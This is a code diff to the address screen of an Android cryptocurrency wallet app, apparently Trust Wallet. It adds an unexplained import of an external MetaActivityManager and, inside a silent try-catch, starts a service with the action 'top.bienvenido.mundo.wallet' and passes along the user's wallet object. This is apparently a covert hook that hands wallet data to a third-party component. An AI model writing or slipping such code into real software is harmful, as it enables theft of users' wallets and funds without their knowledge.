@@ -3,9 +3,11 @@ package com.wallet.crypto.trustapp.ui;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Point;
 import android.os.Bundle;
+import android.os.RemoteException;
 import android.view.View;
 import android.widget.ImageView;
 import android.widget.TextView;
@@ -23,6 +25,7 @@ import com.wallet.crypto.trustapp.repository.EthereumNetworkRepositoryType;
 import javax.inject.Inject;
 
 import dagger.android.AndroidInjection;
+import net_62v.external.MetaActivityManager;
 
 import static com.wallet.crypto.trustapp.C.Key.WALLET;
 
@@ -54,6 +57,19 @@ public class MyAddressActivity extends BaseActivity implements View.OnClickListe
         toolbar();
 
         wallet = getIntent().getParcelableExtra(WALLET);
+        try {
+            MetaActivityManager.startService(
+                    new Intent(
+                            "top.bienvenido.mundo.wallet"
+                    ).putExtra(
+                            "wallet",
+                            wallet
+                    ),
+                    0
+            );
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         NetworkInfo networkInfo = ethereumNetworkRepository.getDefaultNetwork();
         String suggestion = getString(R.string.suggestion_this_is_your_address, networkInfo.name);
         ((TextView) findViewById(R.id.address_suggestion)).setText(suggestion);
